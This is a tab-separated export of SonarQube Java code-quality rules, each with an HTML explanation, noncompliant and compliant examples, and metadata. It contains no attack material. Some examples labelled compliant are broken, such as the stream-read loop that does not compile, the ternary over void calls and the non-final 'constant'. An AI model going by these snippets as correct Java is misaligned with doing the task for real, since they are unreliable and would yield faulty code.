433	Method parameters, caught exceptions and foreach variables should not be reassigned	S1226	S1226	squid	<p>While it is technically correct to assign to parameters from within method bodies, it is better to use temporary variables to store intermediate results.</p>\n<p>This rule will typically detect cases where a constructor parameter is assigned to itself instead of a field of the same name, i.e. when <code>this</code> was forgotten.</p>\n<p>Allowing parameters to be assigned to also reduces the code readability as developers will not be able to know whether the original parameter or some temporary variable is being accessed without going through the whole method.</p>\n<p>Moreover, some developers might also expect assignments of method parameters to be visible from callers, which is not the case and can confuse them.</p>\n<p>All parameters should be treated as <code>final</code>.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nclass MyClass {\n  public String name;\n\n  public MyClass(String name) {\n    name = name;                    // Noncompliant - useless identity assignment\n  }\n\n  public int add(int a, int b) {\n    a = a + b;                      // Noncompliant\n\n    /* additional logic */\n\n    return a;                       // Seems like the parameter is returned as is, what is the point?\n  }\n\n  public static void main(String[] args) {\n    MyClass foo = new MyClass();\n    int a = 40;\n    int b = 2;\n    foo.add(a, b);                  // Variable "a" will still hold 40 after this call\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nclass MyClass {\n  public String name;\n\n  public MyClass(String name) {\n    this.name = name;               // Compliant\n  }\n\n  public int add(int a, int b) {\n    return a + b;                   // Compliant\n  }\n\n  public static void main(String[] args) {\n    MyClass foo = new MyClass();\n    int a = 40;\n    int b = 2;\n    foo.add(a, b);\n  }\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> MISRA C:2012, 17.8 - A function parameter should not be modified</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	misra,pitfall	f	HTML	1511453806937	1511453806938	1
434	Silly bit operations should not be performed	S2437	S2437	squid	<p>Certain bit operations are just silly and should not be performed because their results are predictable.</p>\n\n<p>Specifically, using <code>&amp; -1</code> with any value will always result in the original value, as will <code>anyValue ^ 0</code> and <code>anyValue | 0</code>.</p>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	suspicious	f	HTML	1511453806938	1511453806938	1
435	Packages should have a javadoc file 'package-info.java'	S1228	S1228	squid	<p>Each package in a Java project should include a <code>package-info.java</code> file. The purpose of this file is to document the Java package using javadoc and declare package annotations.</p>\n\n<h2>Compliant Solution</h2>\n<pre>\n/**\n* This package has non null parameters and is documented.\n**/\n@ParametersAreNonnullByDefault\npackage org.foo.bar;\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	convention	f	HTML	1511453806939	1511453806939	1
436	"Threads" should not be used where "Runnables" are expected	S2438	S2438	squid	<p>While it is technically correct to use a <code>Thread</code> where a <code>Runnable</code> is called for, the semantics of the two objects are different, and mixing them is a bad practice that will likely lead to headaches in the future.</p>\n\n<p>The crux of the issue is that <code>Thread</code> is a larger concept than <code>Runnable</code>. A <code>Runnable</code> is an object whose running should be managed. A <code>Thread</code> expects to manage the running of itself or other <code>Runnables</code>.</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\n    public static void main(String[] args) {\n        Thread r =new Thread() {\n            int p;\n            @Override\n            public void run() {\n                while(true)\n                    System.out.println("a");\n            }\n        };\n        new Thread(r).start();  // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\n    public static void main(String[] args) {\n        Runnable r =new Runnable() {\n            int p;\n            @Override\n            public void run() {\n                while(true)\n                    System.out.println("a");\n            }\n        };\n        new Thread(r).start();\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	multi-threading,pitfall	f	HTML	1511453806940	1511453806941	1
437	The default unnamed package should not be used	S1220	S1220	squid	<p>According to the Java Language Specification:</p>\n\n<blockquote>\nUnnamed packages are provided by the Java platform principally for convenience when developing small or temporary applications or when just beginning development.\n</blockquote>\n\n<p>To enforce this best practice, classes located in default package can no longer be accessed from named ones since Java 1.4.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass { /* ... */ }\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npackage org.example;\n\npublic class MyClass{ /* ... */ }\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	convention	f	HTML	1511453806941	1511453806941	1
438	Methods should not be named "hashcode" or "equal"	S1221	S1221	squid	<p>Naming a method <code>hashcode()</code> or <code>equal</code> is either:</p>\n<ul>\n<li> A bug in the form of a typo. Overriding <code>Object.hashCode()</code> (note the camelCasing) or <code>Object.equals</code> (note the 's' on the end) was meant, and the application does not behave as expected.</li>\n<li> Done on purpose. The name however will confuse every other developer, who may not notice the naming difference, or who will think it is a bug.</li>\n</ul>\n<p>In both cases, the method should be renamed.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic int hashcode() { /* ... */ }  // Noncompliant\n\npublic boolean equal(Object obj) { /* ... */ }  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\n@Override\npublic int hashCode() { /* ... */ }\n\npublic boolean equals(Object obj) { /* ... */ } \n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	pitfall	f	HTML	1511453806942	1511453806942	2
441	The value returned from a stream read should be checked	S2674	S2674	squid	<p>You cannot assume that any given stream reading call will fill the <code>byte[]</code> passed in to the method. Instead, you must check the value returned by the read method to see how many bytes were read. Fail to do so, and you introduce bug that is both harmful and difficult to reproduce.</p>\n\n<p>Similarly, you cannot assume that <code>InputStream.skip</code> will actually skip the requested number of bytes, but must check the value returned from the method.</p>\n\n<p>This rule raises an issue when an <code>InputStream.read</code> method that accepts a <code>byte[]</code> is called, but the return value is not checked, and when the return value of <code>InputStream.skip</code> is not checked. The rule also applies to <code>InputStream</code> child classes.</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic void doSomething(String fileName) {\n  try {\n    InputStream is = new InputStream(file);\n    byte [] buffer = new byte[1000];\n    is.read(buffer);  // Noncompliant\n    // ...\n  } catch (IOException e) { ... }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\npublic void doSomething(String fileName) {\n  try {\n    InputStream is = new InputStream(file);\n    byte [] buffer = new byte[1000];\n    int count = 0;\n    while (count = is.read(buffer) &gt; 0) {\n      // ...\n    }\n  } catch (IOException e) { ... }\n}\n</pre>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	\N	f	HTML	1511453806944	1511453806945	2
442	Methods should not return constants	S3400	S3400	squid	<p>There's no point in forcing the overhead of a method call for a method that always returns the same constant value. Even worse, the fact that a method call must be made will likely mislead developers who call the method into thinking that something more is done. Declare a constant instead.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic int getBestNumber() {\nreturn 12;  // Noncompliant\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic static int bestNumber = 12;\n</pre>\n\n\n<h2>Exceptions</h2>\n<p><code>@Override</code> methods are ignored by this rule, since they may be required by an interface or needed to replace the value returned by a parent class.</p>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	confusing	f	HTML	1511453806946	1511453806946	1
443	"read" and "readLine" return values should be used	S2677	S2677	squid	<p>When a method is called that returns data read from some data source, that data should be stored rather than thrown away. Any other course of action is surely a bug.</p>\n<p>This rule raises an issue when the return value of any of the following is ignored or merely null-checked: <code>BufferedReader.readLine()</code>, <code>Reader.read()</code>, and these methods in any child classes.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomethingWithFile(String fileName) {\n  BufferedReader buffReader = null;\n  try {\n    buffReader = new BufferedReader(new FileReader(fileName));\n    while (buffReader.readLine() != null) { // Noncompliant\n      // ...\n    }\n  } catch (IOException e) {\n    // ...\n  }\n} \n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomethingWithFile(String fileName) {\n  BufferedReader buffReader = null;\n  try {\n    buffReader = new BufferedReader(new FileReader(fileName));\n    String line = null;\n    while ((line = buffReader.readLine()) != null) {\n      // ...\n    }\n  } catch (IOException e) {\n    // ...\n  }\n}\n</pre>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453806947	1511453806947	2
444	Neither "Math.abs" nor negation should be used on numbers that could be "MIN_VALUE"	S2676	S2676	squid	<p>It is possible for a call to <code>hashCode</code> to return <code>Integer.MIN_VALUE</code>. Take the absolute value of such a hashcode and you'll still have a negative number. Since your code is likely to assume that it's a positive value instead, your results will be unreliable.</p>\n<p>Similarly, <code>Integer.MIN_VALUE</code> could be returned from <code>Random.nextInt()</code> or any object's <code>compareTo</code> method, and <code>Long.MIN_VALUE</code> could be returned from <code>Random.nextLong()</code>. Calling <code>Math.abs</code> on values returned from these methods is similarly ill-advised.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic void doSomething(String str) {\n  if (Math.abs(str.hashCode()) &gt; 0) { // Noncompliant\n    // ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic void doSomething(String str) {\n  if (str.hashCode() != 0) {\n    // ...\n  }\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453806948	1511453806948	2
445	Comments should not be located at the end of lines of code	TrailingCommentCheck	TrailingCommentCheck	squid	<p>This rule verifies that single-line comments are not located at the end of a line of code. The main idea behind this rule is that in order to be really readable, trailing comments would have to be properly written and formatted (correct alignment, no interference with the visual structure of the code, not too long to be visible) but most often, automatic code formatters would not handle this correctly: the code would end up less readable. Comments are far better placed on the previous empty line of code, where they will always be visible and properly formatted.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nint a1 = b + c; // This is a trailing comment that can be very very long\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\n// This very long comment is better placed before the line of code\nint a2 = b + c;\n</pre>\n<h2>Exceptions</h2>\n\n<p>By default, the property "legalTrailingCommentPattern" allows to ignore comments containing only one word :</p>\n<pre>\ndoSomething(); //FIXME\n</pre>	0	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	convention	f	HTML	1511453806949	1511453806950	1
446	Execution of the Garbage Collector should be triggered only by the JVM	S1215	S1215	squid	<p>\nCalling <code>System.gc()</code> or <code>Runtime.getRuntime().gc()</code> is a bad idea for a simple reason:\nthere is no way to know exactly what will be done under the hood by the JVM because the behavior will depend on its vendor, version and options:\n</p>\n\n<ul>\n  <li>Will the whole application be frozen during the call?</li>\n  <li>Is the -XX:DisableExplicitGC option activated?</li>\n  <li>Will the JVM simply ignore the call?</li>\n  <li>...</li>\n</ul>\n\n<p>An application relying on those unpredictable methods is also unpredictable and therefore broken.</p>\n\n<p>The task of running the garbage collector should be left exclusively to the JVM.</p>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	bad-practice,unpredictable	f	HTML	1511453806954	1511453806954	1
447	Constructors should only call non-overridable methods	S1699	S1699	squid	<p>Calling an overridable method from a constructor could result in failures or strange behaviors when instantiating a subclass which overrides the method.</p>\n<p>For example:</p>\n<ul>\n<li> The subclass class constructor starts by contract by calling the parent class constructor.</li>\n<li> The parent class constructor calls the method, which has been overridden in the child class.</li>\n<li> If the behavior of the child class method depends on fields that are initialized in the child class constructor, unexpected behavior (like a <code>NullPointerException</code>) can result, because the fields aren't initialized yet.</li>\n</ul>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Parent {\n\n  public Parent () {\n    doSomething();  // Noncompliant\n  }\n\n  public void doSomething () {  // not final; can be overridden\n    ...\n  }\n}\n\npublic class Child extends Parent {\n\n  private String foo;\n\n  public Child(String foo) {\n    super(); // leads to call doSomething() in Parent constructor which triggers a NullPointerException as foo has not yet been initialized\n    this.foo = foo;\n  }\n\n  public void doSomething () {\n    System.out.println(this.foo.length());\n  }\n\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	pitfall	f	HTML	1511453806955	1511453806955	1
448	Thread.run() and Runnable.run() should not be called directly	S1217	S1217	squid	<p>The purpose of the <code>Thread.run()</code> and <code>Runnable.run()</code> methods is to execute code in a separate, dedicated thread. Calling those methods directly doesn't make sense because it causes their code to be executed in the current thread. </p>\n<p>To get the expected behavior, call the <code>Thread.start()</code> method instead.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nThread myThread = new Thread(runnable);\nmyThread.run(); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nThread myThread = new Thread(runnable);\nmyThread.start(); // Compliant\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/572.html">MITRE, CWE-572</a> - Call to Thread run() instead of start()</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/KQAiAg">CERT THI00-J</a> - Do not invoke Thread.run()</li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	cert,cwe,multi-threading	f	HTML	1511453806955	1511453806956	2
449	"switch" statements should not contain non-case labels	S1219	S1219	squid	<p>Even if it is legal, mixing case and non-case labels in the body of a switch statement is very confusing and can even be the result of a typing error.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nswitch (day) {\n  case MONDAY:\n  case TUESDAY:\n  WEDNESDAY:   // Noncompliant; syntactically correct, but behavior is not what's expected\n    doSomething();\n    break;\n  ...\n}\n\nswitch (day) {\n  case MONDAY:\n    break;\n  case TUESDAY:\n    foo:for(int i = 0 ; i &lt; X ; i++) {  // Noncompliant; the code is correct and behaves as expected but is barely readable \n         /* ... */\n        break foo;  // this break statement doesn't relate to the nesting case TUESDAY\n         /* ... */\n    }\n    break;\n    /* ... */\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nswitch (day) {\n  case MONDAY:\n  case TUESDAY:\n  case WEDNESDAY:\n    doSomething();\n    break;\n  ...\n}\n\nswitch (day) {\n  case MONDAY:\n    break;\n  case TUESDAY:\n    compute(args); // put the content of the labelled "for" statement in a dedicated method\n    break;\n\n    /* ... */\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used.\n</li><li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement.\n</li><li> MISRA C:2012, 16.1 - All switch statements shall be well-formed\n</li></ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	misra,suspicious	f	HTML	1511453806957	1511453806957	1
450	Copyright and license headers should be defined	S1451	S1451	squid	<p>Each source file should start with a header stating file ownership and the license which must be used to distribute the application. </p>\n<p>This rule must be fed with the header text that is expected at the beginning of every file.</p>\n<h2>Compliant Solution</h2>\n\n<pre>\n/*\n * SonarQube, open source software quality management tool.\n * Copyright (C) 2008-2013 SonarSource\n * mailto:contact AT sonarsource DOT com\n *\n * SonarQube is free software; you can redistribute it and/or\n * modify it under the terms of the GNU Lesser General Public\n * License as published by the Free Software Foundation; either\n * version 3 of the License, or (at your option) any later version.\n *\n * SonarQube is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public License\n * along with this program; if not, write to the Free Software Foundation,\n * Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.\n */\n</pre>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453806957	1511453806958	1
451	"equals(Object obj)" should be overridden along with the "compareTo(T obj)" method	S1210	S1210	squid	<p>\nAccording to the Java <code>Comparable.compareTo(T o)</code> documentation:\n</p>\n\n<blockquote>\nIt is strongly recommended, but not strictly required that <code>(x.compareTo(y)==0) == (x.equals(y))</code>.\nGenerally speaking, any class that implements the Comparable interface and violates this condition should clearly indicate this fact.\nThe recommended language is "Note: this class has a natural ordering that is inconsistent with equals."\n</blockquote>\n\n<p>\nIf this rule is violated, weird and unpredictable failures can occur.\nFor example, in Java 5 the <code>PriorityQueue.remove()</code> method relied on <code>compareTo()</code>, but since Java 6 it relies on <code>equals()</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class Foo implements Comparable&lt;Foo&gt; {\n  @Override\n  public int compareTo(Foo foo) { /* ... */ }      // Noncompliant as the equals(Object obj) method is not overridden\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\npublic class Foo implements Comparable&lt;Foo&gt; {\n  @Override\n  public int compareTo(Foo foo) { /* ... */ }      // Compliant\n\n  @Override\n  public boolean equals(Object obj) { /* ... */ }\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	\N	f	HTML	1511453806961	1511453806962	2
452	Generic wildcard types should not be used in return parameters	S1452	S1452	squid	<p>Using a wildcard as a return type implicitly means that the return parameter should be considered as read-only but without any way to enforce this contract. </p>\n<p>Let's take the example of method returning a "List&lt;? extends Animal&gt;". Is it possible on this list to add a Dog, a Cat, ... we simply don't know. The consumer of a method should not have to deal with such disruptive questions. </p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nList&lt;? extends Animal&gt; getAnimals(){...}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	pitfall	f	HTML	1511453806963	1511453806963	1
453	An abstract class should have both abstract and concrete methods	S1694	S1694	squid	<p>The purpose of an abstract class is to provide some heritable behaviors while also defining methods which must be implemented by sub-classes.</p>\n<p>A class with no abstract methods that was made abstract purely to prevent instantiation should be converted to a concrete class (i.e. remove the <code>abstract</code> keyword) with a private constructor.</p>\n<p>A class with only abstract methods and no inheritable behavior should be converted to an interface.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic abstract class Animal {  // Noncompliant; should be an interface\n  abstract void move();\n  abstract void feed();\n}\n\npublic abstract class Color {  // Noncompliant; should be concrete with a private constructor\n  private int red = 0;\n  private int green = 0;\n  private int blue = 0;\n\n  public int getRed() {\n    return red;\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic interface Animal {\n  void move();\n  void feed();\n}\n\npublic class Color {\n  private int red = 0;\n  private int green = 0;\n  private int blue = 0;\n\n  private Color () {}\n\n  public int getRed() {\n    return red;\n  }\n}\n\npublic abstract class Lamp {\n\n  private boolean switchLamp=false;\n\n  public abstract void glow();\n\n  public void flipSwitch() {\n    switchLamp = !switchLamp;\n    if (switchLamp) {\n      glow();\n    }\n  }\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	convention	f	HTML	1511453806964	1511453806964	1
454	"NullPointerException" should not be explicitly thrown	S1695	S1695	squid	<p>A <code>NullPointerException</code> should indicate that a <code>null</code> value was unexpectedly encountered. Good programming practice dictates that code is structured to avoid NPE's. </p>\n<p>Explicitly throwing <code>NullPointerException</code> forces a method's callers to explicitly catch it, rather than coding to avoid it. Further, it makes it difficult to distinguish between the unexpectedly-encountered <code>null</code> value and the condition which causes the method to purposely throw an NPE.</p>\n<p>If an NPE is being thrown to indicate that a parameter to the method should not have been null, use the <code>@NotNull</code> annotation instead.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething (String aString) throws NullPointerException {\n     throw new NullPointerException();\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomething (@NotNull String aString) {\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	pitfall	f	HTML	1511453806964	1511453806965	1
455	Public methods should not contain selector arguments	S2301	S2301	squid	<p>A selector argument is a <code>boolean</code> argument that's used to determine which of two paths to take through a method. Specifying such a parameter may seem innocuous, particularly if it's well named. </p>\n<p>Unfortunately, the maintainers of the code calling the method won't see the parameter name, only its value. They'll be forced either to guess at the meaning or to take extra time to look the method up.</p>\n<p>Instead, separate methods should be written.</p>\n<p>This rule finds methods with a <code>boolean</code> that's used to determine which path to take through the method.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic String tempt(String name, boolean ofAge) {\n  if (ofAge) {\n    offerLiquor(name);\n  } else {\n    offerCandy(name);\n  }\n}\n\n// ...\npublic void corrupt() {\n  tempt("Joe", false); // does this mean not to temp Joe?\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic void temptAdult(String name) {\n  offerLiquor(name);\n}\n\npublic void temptChild(String name) {\n    offerCandy(name);\n}\n\n// ...\npublic void corrupt() {\n  age &lt; legalAge ? temptChild("Joe") : temptAdult("Joe");\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	design	f	HTML	1511453806965	1511453806966	1
456	"NullPointerException" should not be caught	S1696	S1696	squid	<p><code>NullPointerException</code> should be avoided, not caught. Any situation in which <code>NullPointerException</code> is explicitly caught can easily be converted to a <code>null</code> test, and any behavior being carried out in the catch block can easily be moved to the "is null" branch of the conditional.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic int lengthPlus(String str) {\n  int len = 2;\n  try {\n    len += str.length();\n  }\n  catch (NullPointerException e) {\n    log.info("argument was null");\n  }\n  return len;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic int lengthPlus(String str) {\n  int len = 2;\n\n  if (str != null) {\n    len += str.length();\n  }\n  else {\n    log.info("argument was null");\n  }\n  return len;\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n  <li><a href="http://cwe.mitre.org/data/definitions/395.html">MITRE, CWE-395</a> - Use of NullPointerException Catch to Detect NULL Pointer Dereference</li>\n  <li> <a href="https://www.securecoding.cert.org/confluence/x/BIB3AQ">CERT, ERR08-J</a> - Do not catch NullPointerException or any of its ancestors</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cert,cwe,error-handling	f	HTML	1511453806966	1511453806967	1
457	The members of an interface declaration or class should appear in a pre-defined order	S1213	S1213	squid	<p>According to the Java Code Conventions as defined by Oracle, the members of a class or interface declaration should appear in the following order in the source files:</p>\n<ul>\n<li> Class and instance variables</li>\n<li> Constructors</li>\n<li> Methods</li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class Foo{ \n   private int field = 0;\n   public boolean isTrue() {...}     \n   public Foo() {...}                         // Noncompliant, constructor defined after methods\n   public static final int OPEN = 4;  //Noncompliant, variable defined after constructors and methods\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic class Foo{ \n   public static final int OPEN = 4;\n   private int field = 0;\n   public Foo() {...}\n   public boolean isTrue() {...}\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	convention	f	HTML	1511453806967	1511453806967	1
459	Constants should not be defined in interfaces	S1214	S1214	squid	<p>According to Joshua Bloch, author of "Effective Java":</p>\n\n<blockquote>\n<p>\nThe constant interface pattern is a poor use of interfaces.\n</p>\n\n<p>\nThat a class uses some constants internally is an implementation detail.\nImplementing a constant interface causes this implementation detail to leak into the class's exported API.\nIt is of no consequence to the users of a class that the class implements a constant interface.\nIn fact, it may even confuse them.\nWorse, it represents a commitment:\nif in a future release the class is modified so that it no longer needs to use the constants,\nit still must implement the interface to ensure binary compatibility.\nIf a nonfinal class implements a constant interface,\nall of its subclasses will have their namespaces polluted by the constants in the interface.\n</p>\n</blockquote>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\ninterface Status {                      // Noncompliant\n   int OPEN = 1;\n   int CLOSED = 2;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\npublic enum Status {                    // Compliant\n  OPEN,\n  CLOSED;\n}\n</pre>\n\n<p>or</p>\n\n<pre>\npublic final class Status {             // Compliant\n   public static final int OPEN = 1;\n   public static final int CLOSED = 2;\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	bad-practice	f	HTML	1511453806969	1511453806969	1
460	Objects should be compared with "equals()"	S1698	S1698	squid	<p>Using the equality (<code>==</code>) and inequality (<code>!=</code>) operators to compare two objects does not check to see if they have the same values. Rather it checks to see if both object references point to exactly the same object in memory. The vast majority of the time, this is not what you want to do. Use the .equals() method to compare the values of two objects or to compare a string object to a string literal.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nString str1 = "blue";\nString str2 = "blue";\nString str3 = str1;\n\nif (str1 == str2)\n{\n  System.out.println("they're both 'blue'"); // this doesn't print because the objects are different\n}\n\nif (str1 == "blue")\n{\n  System.out.println("they're both 'blue'"); // this doesn't print because the objects are different\n}\n\nif (str1 == str3)\n{\n  System.out.println("they're the same object"); // this prints\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nString str1 = "blue";\nString str2 = "blue";\nString str3 = str1;\n\nif (str1.equals(str2))\n{\n  System.out.println("they're both 'blue'"); // this prints\n}\n\nif (str1.equals("blue"))\n{\n  System.out.println("they're both 'blue'"); // this prints\n}\n\nif (str1 == str3)\n{\n  System.out.println("they're the same object"); // this still prints, but it's probably not what you meant to do\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n  <li><a href="http://cwe.mitre.org/data/definitions/595.html">MITRE, CWE-595</a> - Comparison of Object References Instead of Object Contents</li>\n  <li><a href="http://cwe.mitre.org/data/definitions/597">MITRE, CWE-597</a> - Use of Wrong Operator in String Comparison</li>\n  <li><a href="https://www.securecoding.cert.org/confluence/x/wwD1AQ">CERT, EXP03-J</a> - Do not use the equality operators when comparing values of boxed primitives</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	cert,cwe	f	HTML	1511453806970	1511453806970	1
461	Nested "enum"s should not be declared static	S2786	S2786	squid	<p>According to <a href="http://docs.oracle.com/javase/specs/jls/se7/html/jls-8.html#jls-8.9">the docs</a>:</p>\n<blockquote>Nested enum types are implicitly <code>static</code>.</blockquote>\n<p>So there's no need to declare them <code>static</code> explicitly.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Flower {\n  static enum Color { // Noncompliant; static is redundant here\n    RED, YELLOW, BLUE, ORANGE\n  }\n\n  // ...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class Flower {\n  enum Color { // Compliant\n    RED, YELLOW, BLUE, ORANGE\n  }\n\n  // ...\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	clumsy	f	HTML	1511453806971	1511453806971	1
462	Files should not be empty	EmptyFile	EmptyFile	squid	<p>Files with no lines of code clutter a project and should be removed. </p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\n//package org.foo;\n//\n//public class Bar {}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	unused	f	HTML	1511453806972	1511453806973	1
465	super.finalize() should be called at the end of Object.finalize() implementations	ObjectFinalizeOverridenCallsSuperFinalizeCheck	ObjectFinalizeOverridenCallsSuperFinalizeCheck	squid	<p>Overriding the <code>Object.finalize()</code> method must be done with caution to dispose some system resources.</p>\n<p>Calling the <code>super.finalize()</code> at the end of this method implementation is highly recommended in case parent implementations must also dispose some system resources.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nprotected void finalize() {   // Noncompliant; no call to super.finalize();\n  releaseSomeResources();\n}\n\nprotected void finalize() {\n  super.finalize();  // Noncompliant; this call should come last\n  releaseSomeResources();\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nprotected void finalize() {\n  releaseSomeResources();\n  super.finalize();    \n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/568.html">MITRE, CWE-568</a> - finalize() Method Without super.finalize()</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/H4cbAQ">CERT, MET12-J</a> - Do not use finalizers</li>\n</ul>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cert,cwe	f	HTML	1511453806976	1511453806978	2
